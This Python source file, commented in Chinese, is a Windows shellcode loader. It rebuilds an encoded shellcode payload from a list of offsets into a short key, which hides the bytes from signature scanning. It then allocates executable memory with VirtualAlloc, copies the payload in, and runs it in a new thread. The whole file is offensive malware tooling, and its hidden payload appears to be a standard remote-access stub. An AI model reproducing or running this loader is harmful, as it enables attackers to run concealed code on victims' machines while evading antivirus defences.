# -*- coding: UTF-8 -*-
import ctypes
from sys import version_info

# 随机数key
key = 'a230f9c1854e7d6b'
# 偏移量列表
shellcod_list = [4, 6, 10, 8, 8, 2, 11, 10, 4, 3, 11, 8, 6, 6, 3, 3, 3, 3, 3, 3, 10, 7, 9, 7, 10, 7, 9, 3, 9, 1, 10, 8, 2, 7, 13, 1, 9, 7, 14, 9, 10, 8, 8, 15, 9, 1, 14, 3, 9, 14, 10, 8, 8, 15, 9, 1, 7, 8, 10, 8, 8, 15, 9, 1, 1, 3, 10, 13, 2, 7, 6, 5, 10, 8, 3, 4, 15, 12, 10, 0, 10, 0, 10, 8, 8, 15, 12, 1, 9, 3, 10, 
8, 2, 7, 6, 3, 0, 6, 2, 6, 14, 7, 12, 6, 3, 1, 1, 6, 1, 3, 10, 7, 6, 7, 6, 5, 3, 13, 10, 7, 3, 7, 6, 7, 11, 1, 11, 13, 9, 1, 10, 8, 8, 15, 9, 1, 1, 3, 10, 7, 9, 7, 8, 15, 10, 1, 2, 6, 10, 8, 3, 7, 13, 3, 14, 14, 8, 7, 12, 8, 7, 8, 3, 15, 3, 1, 3, 4, 8, 9, 12, 1, 3, 3, 3, 3, 3, 3, 8, 15, 8, 3, 8, 8, 3, 3, 3, 3, 3, 3, 10, 8, 8, 9, 6, 3, 12, 10, 14, 12, 10, 8, 3, 7, 13, 3, 10, 10, 8, 15, 10, 3, 1, 3, 10, 5, 3, 7, 13, 3, 8, 15, 10, 8, 7, 8, 9, 3, 11, 2, 9, 14, 10, 8, 4, 4, 6, 5, 10, 13, 2, 7, 6, 5, 10, 7, 8, 15, 2, 10, 8, 8, 10, 8, 3, 7, 13, 14, 10, 8, 2, 7, 6, 3, 0, 6, 10, 7, 6, 7, 6, 5, 3, 13, 10, 7, 3, 7, 6, 7, 2, 8, 11, 3, 12, 9, 4, 7, 10, 6, 3, 2, 10, 6, 1, 10, 3, 8, 10, 9, 2, 5, 13, 7, 12, 9, 13, 8, 9, 8, 10, 10, 8, 15, 10, 3, 1, 10, 10, 5, 3, 7, 13, 3, 14, 14, 10, 7, 8, 15, 3, 6, 10, 8, 10, 10, 8, 15, 10, 3, 7, 6, 10, 5, 3, 7, 13, 3, 10, 7, 8, 15, 3, 10, 8, 8, 10, 7, 9, 8, 10, 8, 3, 7, 13, 3, 10, 7, 9, 8, 9, 11, 9, 5, 9, 0, 10, 7, 9, 8, 10, 7, 9, 5, 10, 7, 9, 0, 10, 8, 8, 2, 11, 6, 1, 3, 10, 7, 9, 1, 4, 4, 11, 3, 9, 8, 10, 7, 9, 5, 9, 0, 10, 8, 8, 15, 7, 1, 11, 5, 10, 15, 4, 4, 4, 4, 4, 4, 9, 13, 10, 5, 15, 11, 12, 12, 12, 2, 2, 1, 9, 4, 2, 2, 2, 1, 3, 3, 3, 3, 10, 7, 9, 14, 10, 5, 8, 5, 11, 14, 10, 8, 8, 7, 11, 6, 0, 3, 3, 7, 3, 3, 3, 3, 10, 5, 8, 5, 11, 9, 10, 5, 15, 6, 3, 1, 3, 3, 7, 4, 5, 3, 6, 3, 0, 8, 3, 1, 8, 3, 10, 7, 9, 10, 10, 5, 8, 5, 11, 10, 10, 6, 8, 5, 4, 7, 10, 7, 15, 0, 10, 6, 12, 12, 1, 14, 3, 12, 4, 4, 13, 9, 10, 6, 8, 5, 11, 0, 14, 8, 3, 7, 3, 7, 3, 3, 3, 3, 9, 5, 10, 7, 15, 0, 1, 5, 8, 3, 14, 15, 3, 3, 4, 4, 13, 9, 14, 0, 3, 0, 10, 7, 9, 11, 9, 3, 9, 3, 10, 13, 2, 7, 6, 5, 10, 13, 2, 7, 6, 3, 10, 8, 4, 4, 6, 3, 10, 8, 8, 5, 6, 1, 10, 8, 4, 4, 6, 3, 10, 8, 8, 5, 6, 7, 10, 7, 15, 0, 11, 0, 3, 4, 13, 4, 11, 3, 4, 4, 13, 9, 10, 8, 8, 5, 6, 12, 14, 0, 7, 3, 10, 7, 9, 8, 10, 6, 8, 5, 11, 1, 10, 8, 8, 5, 4, 5, 10, 7, 15, 0, 5, 5, 
0, 9, 12, 10, 14, 7, 4, 4, 13, 9, 8, 9, 6, 3, 12, 10, 3, 0, 10, 5, 4, 4, 6, 11, 12, 9, 11, 9, 11, 8, 5, 2, 3, 3, 3, 3, 3, 3, 10, 8, 8, 2, 11, 6, 7, 3, 10, 8, 8, 5, 11, 1, 10, 13, 2, 7, 6, 5, 14, 0, 3, 10, 10, 7, 9, 8, 10, 8, 8, 5, 4, 5, 10, 7, 15, 0, 3, 1, 13, 5, 6, 8, 9, 4, 4, 4, 13, 9, 8, 2, 4, 8, 3, 3, 12, 11, 9, 9, 10, 8, 8, 2, 6, 10, 1, 3, 9, 11, 8, 5, 4, 14, 14, 0, 10, 3, 10, 7, 9, 5, 14, 8, 3, 3, 7, 3, 3, 3, 3, 3, 10, 7, 9, 8, 10, 8, 8, 5, 4, 1, 10, 8, 2, 7, 6, 5, 10, 7, 15, 0, 9, 8, 0, 10, 9, 2, 11, 9, 4, 4, 13, 9, 10, 8, 8, 5, 6, 2, 10, 5, 8, 5, 6, 12, 10, 13, 2, 7, 6, 5, 10, 5, 8, 5, 4, 3, 10, 8, 8, 5, 13, 0, 10, 8, 8, 5, 4, 5, 10, 7, 15, 0, 3, 1, 13, 5, 6, 8, 9, 4, 4, 4, 13, 9, 8, 2, 4, 8, 3, 3, 12, 13, 1, 8, 9, 8, 10, 7, 9, 12, 9, 5, 14, 8, 3, 3, 10, 3, 3, 3, 3, 3, 10, 7, 9, 8, 14, 0, 3, 3, 9, 0, 10, 7, 15, 0, 3, 15, 1, 4, 3, 4, 2, 3, 4, 4, 13, 9, 9, 12, 9, 5, 10, 7, 15, 0, 12, 9, 14, 11, 10, 13, 14, 7, 4, 4, 13, 
9, 10, 5, 4, 4, 6, 11, 11, 5, 2, 6, 4, 4, 4, 4, 4, 4, 10, 8, 3, 7, 6, 2, 10, 8, 1, 5, 6, 14, 10, 8, 8, 9, 4, 14, 12, 9, 15, 10, 10, 7, 4, 4, 11, 12, 9, 8, 14, 0, 3, 3, 9, 5, 10, 5, 6, 12, 6, 1, 4, 3, 15, 9, 0, 1, 9, 14, 4, 4, 13, 9]
# 还原shellcode
buf = ''
for i in shellcod_list:
	buf += key[i]

if version_info >= (3,0):
	shellcode = bytearray(bytes.fromhex(buf))
else:
	shellcode = bytearray(buf.decode('hex'))

ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64
ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
handle= ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))